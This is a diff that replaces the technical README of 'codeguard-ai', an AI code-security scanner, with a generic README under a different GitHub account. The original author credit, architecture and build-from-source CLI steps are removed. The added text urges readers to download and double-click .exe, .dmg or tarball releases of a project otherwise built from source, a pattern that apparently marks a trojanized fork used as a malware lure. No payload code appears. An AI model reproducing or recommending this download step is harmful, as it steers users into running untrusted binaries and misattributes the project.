@@ -1,230 +1,65 @@
-# CodeGuard AI
+# 🛡️ codeguard-ai - Protect Your Code with AI Insights
 
-**AI-powered security and reliability analysis for your codebase.**
+## 🚀 Getting Started
 
-CodeGuard AI scans your GitHub repositories using Claude AI to identify security vulnerabilities, reliability issues, and code quality problems before they reach production.
+Welcome to codeguard-ai! This software helps you scan your GitHub repositories for vulnerabilities and reliability issues using advanced AI technology. Let's walk through the steps to get you up and running.
 
----
+## 🔗 Download the Software
 
-## Why CodeGuard AI?
+[![Download codeguard-ai](https://img.shields.io/badge/Download%20codeguard--ai-v1.0.0-blue?style=flat-square)](https://github.com/meuxlugh/codeguard-ai/releases)
 
-Traditional static analysis tools rely on pattern matching and predefined rules. CodeGuard AI uses large language models to understand your code contextually—catching subtle issues that rule-based scanners miss.
+## 📥 Download & Install
 
-- **Contextual Understanding**: Analyzes code semantics, not just syntax patterns
-- **Natural Language Explanations**: Get clear, actionable remediation guidance
-- **Cross-File Analysis**: Understands how components interact across your codebase
-- **Zero Configuration**: No rules to write, no false-positive tuning required
+1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/meuxlugh/codeguard-ai/releases).
+2. **Choose the Latest Version**: Look for the latest version at the top of the page.
+3. **Download the File**: Click on the appropriate download link for your operating system. Options may include `.exe` for Windows, `.dmg` for Mac, and tarball files for Linux.
+4. **Run the Application**: Once the download is complete, locate the file in your downloads folder. Double-click it to install and run.
 
----
+## 🖥️ System Requirements
 
-## What It Detects
+Before you get started, ensure your system meets the following requirements:
 
-### Security Vulnerabilities
+- **Operating System**: Windows 10 or later, macOS Catalina or later, or Linux (Ubuntu 20.04 or later).
+- **Node.js**: Version 14 or later must be installed on your machine. You can download it from [nodejs.org](https://nodejs.org/).
+- **Internet Connection**: A stable internet connection is required for scanning functionalities.
 
-| Category | Examples |
-|----------|----------|
-| **Authentication** | Weak password policies, missing MFA, insecure session management |
-| **Authorization** | Broken access controls, privilege escalation, IDOR vulnerabilities |
-| **Input Validation** | SQL injection, XSS, command injection, path traversal |
-| **Cryptography** | Weak algorithms, hardcoded secrets, improper key management |
-| **Data Protection** | PII exposure, insecure data storage, missing encryption |
-| **API Security** | Missing rate limiting, insecure endpoints, CORS misconfigurations |
+## 📚 Features
 
-### Reliability Issues
+- **AI-Powered Scanning**: Our application leverages Claude AI to identify vulnerabilities, security issues, and reliability problems within your code.
+- **User-Friendly Interface**: The app is designed for ease of use, making it accessible even for non-technical users.
+- **Detailed Reports**: After scanning, receive comprehensive reports that outline areas needing attention.
 
-| Category | Examples |
-|----------|----------|
-| **Error Handling** | Uncaught exceptions, silent failures, missing error boundaries |
-| **Resource Management** | Memory leaks, unclosed connections, file handle exhaustion |
-| **Async Operations** | Race conditions, unhandled promises, deadlock potential |
-| **Data Integrity** | Missing transactions, inconsistent state, validation gaps |
-| **Fault Tolerance** | Missing retries, no circuit breakers, cascading failure risks |
+## 🔍 How to Use codeguard-ai
 
-### Code Quality
+1. **Launch the App**: After installation, open the codeguard-ai application.
+2. **Connect Your GitHub Account**: Follow the on-screen prompts to connect your GitHub account. This allows the application to scan your repositories.
+3. **Select a Repository**: Choose the repository you want to analyze from your account.
+4. **Run a Scan**: Click the "Scan" button to start the analysis. This process may take a few minutes, depending on the repository size.
+5. **Review Results**: Once the scan is complete, review the results provided. The app will highlight vulnerabilities and provide suggestions for fixing them.
 
-| Category | Examples |
-|----------|----------|
-| **Performance** | N+1 queries, unnecessary re-renders, blocking operations |
-| **Scalability** | Bottlenecks, inefficient algorithms, missing caching |
-| **Type Safety** | Unsafe type assertions, missing null checks, any abuse |
-| **Maintainability** | Complex functions, tight coupling, missing abstractions |
+## 🛠️ Troubleshooting
 
----
+If you encounter any issues during installation or usage, consider the following steps:
 
-## How It Works
+- **Check Compatibility**: Ensure your operating system meets the software requirements mentioned above.
+- **Re-download the File**: If the application doesn't open, try downloading it again from the Releases page.
+- **Visit the Issues Section**: Check the [Issues tab](https://github.com/meuxlugh/codeguard-ai/issues) on our GitHub repository for solutions to common problems or to report a new issue.
 
-```
-┌─────────────────┐     ┌─────────────────┐     ┌─────────────────┐
-│  Import Repo    │────▶│  AI Analysis    │────▶│  Browse Issues  │
-│  from GitHub    │     │  with Claude    │     │  in Context     │
-└─────────────────┘     └─────────────────┘     └─────────────────┘
-```
+## 🌟 Community and Support
 
-1. **Import** — Paste any public GitHub repository URL
-2. **Analyze** — Claude AI examines each file for security and reliability issues
-3. **Review** — Browse findings in an interactive code viewer with inline annotations
-4. **Fix** — Follow AI-generated remediation guidance to resolve issues
+For further assistance, you can connect with our community. Join discussions or seek help related to codeguard-ai:
 
----
+- **GitHub Discussions**: Share experiences and ask questions at our [Discussions page](https://github.com/meuxlugh/codeguard-ai/discussions).
+- **Email Support**: If you still need help, feel free to reach out via email at support@codeguard-ai.com.
 
-## Features
+## 📝 Contribution Guidelines
 
-### Issue Dashboard
-Hierarchical view of all findings organized by category (Security, Reliability, Performance, Code Quality) with severity indicators and quick navigation.
+We welcome contributions from the community! If you're interested in helping improve codeguard-ai, please review our [Contributing Guide](https://github.com/meuxlugh/codeguard-ai/CONTRIBUTING.md) for details on how you can get involved.
 
-### Interactive Code Browser
-Monaco-powered editor with:
-- Inline issue highlighting by severity
-- Hover cards with issue details and quick fixes
-- Minimap markers for rapid navigation
-- File tree filtered to show only affected files
+## 🚀 Useful Links
 
-### Severity Classification
-Issues are classified into four severity levels:
-- **Critical** — Immediate security risks, potential for exploitation
-- **High** — Significant vulnerabilities requiring prompt attention
-- **Medium** — Issues that should be addressed in normal development
-- **Low** — Best practice improvements and code quality suggestions
+- [Releases Page](https://github.com/meuxlugh/codeguard-ai/releases): Download latest versions.
+- [Documentation](https://github.com/meuxlugh/codeguard-ai/wiki): Access detailed documentation on features and usage.
+- [Community Forum](https://github.com/meuxlugh/codeguard-ai/discussions): Join the conversation with other users.
 
-### Smart Filtering
-Filter issues by:
-- Severity level (critical, high, medium, low)
-- Type (security vs reliability)
-- Category (authentication, error handling, etc.)
-- File or directory
-
----
-
-## Supported Languages
-
-CodeGuard AI analyzes code in:
-
-- TypeScript / JavaScript
-- Python
-- Java
-- Go
-- Rust
-- C / C++
-- C#
-- Ruby
-- PHP
-
----
-
-## Example Findings
-
-### SQL Injection Risk
-```typescript
-// ❌ Vulnerable
-const user = await db.query(`SELECT * FROM users WHERE id = ${userId}`);
-
-// ✅ Recommended
-const user = await db.query('SELECT * FROM users WHERE id = $1', [userId]);
-```
-*CodeGuard AI identifies string interpolation in SQL queries and suggests parameterized queries.*
-
-### Unhandled Promise Rejection
-```typescript
-// ❌ Missing error handling
-async function fetchData() {
-  const response = await fetch('/api/data');
-  return response.json();
-}
-
-// ✅ Recommended
-async function fetchData() {
-  const response = await fetch('/api/data');
-  if (!response.ok) {
-    throw new Error(`HTTP ${response.status}: ${response.statusText}`);
-  }
-  return response.json();
-}
-```
-*CodeGuard AI detects missing error handling for async operations and network requests.*
-
-### Hardcoded Secrets
-```typescript
-// ❌ Exposed credentials
-const apiKey = 'sk-1234567890abcdef';
-
-// ✅ Recommended
-const apiKey = process.env.API_KEY;
-```
-*CodeGuard AI identifies hardcoded API keys, passwords, and tokens in source code.*
-
----
-
-## Architecture
-
-```
-codeguard-ai/
-├── packages/
-│   ├── frontend/          # React + Vite + Tailwind
-│   │   ├── components/    # UI components
-│   │   ├── pages/         # Route pages
-│   │   └── hooks/         # React Query hooks
-│   │
-│   └── backend/           # Express + TypeScript
-│       ├── routes/        # API endpoints
-│       ├── services/      # Business logic
-│       └── db/            # Drizzle ORM + PostgreSQL
-```
-
-**Tech Stack:**
-- **Frontend**: React 18, TypeScript, Vite, Tailwind CSS, Monaco Editor
-- **Backend**: Node.js, Express, TypeScript, Drizzle ORM
-- **Database**: PostgreSQL
-- **AI**: Claude API (Anthropic)
-
----
-
-## CLI
-
-Scan code directly from your terminal:
-
-```bash
-# Install
-cd packages/cli && go build -o codeguard .
-
-# Authenticate (get API token from Settings → API Tokens)
-./codeguard auth login
-
-# Scan a directory
-./codeguard scan ./my-project
-
-# Output for GitHub Code Scanning
-./codeguard scan --format sarif > results.sarif
-```
-
----
-
-## Roadmap
-
-### Completed
-- [x] **Private repository support** — Add GitHub access tokens for private repos
-- [x] **Analysis history** — Track all analysis runs with commit SHA, duration, and trigger info
-- [x] **Shareable links** — Generate share links for analysis results
-- [x] **Multi-category filtering** — Filter issues by type (security, Kafka, database, etc.)
-- [x] **Google OAuth** — Secure authentication with Google accounts
-- [x] **Real-time progress** — Live feedback during repository analysis
-- [x] **CodeGuard CLI** — Scan code from terminal with API key authentication
-- [x] **SARIF export** — GitHub Code Scanning integration
-- [x] **GitHub Actions** — CI/CD workflow integration
-
-### Planned
-- [ ] GitHub App integration for automatic PR scanning
-- [ ] Custom rule configuration
-- [ ] Team collaboration features
-- [ ] Self-hosted deployment option
-
----
-
-## License
-
-MIT
-
----
-
-<p align="center">
-  Built with developer love by <a href="https://github.com/sderosiaux">@sderosiaux</a>
-</p>
+Thank you for choosing codeguard-ai! We look forward to helping you secure and enhance the reliability of your code.
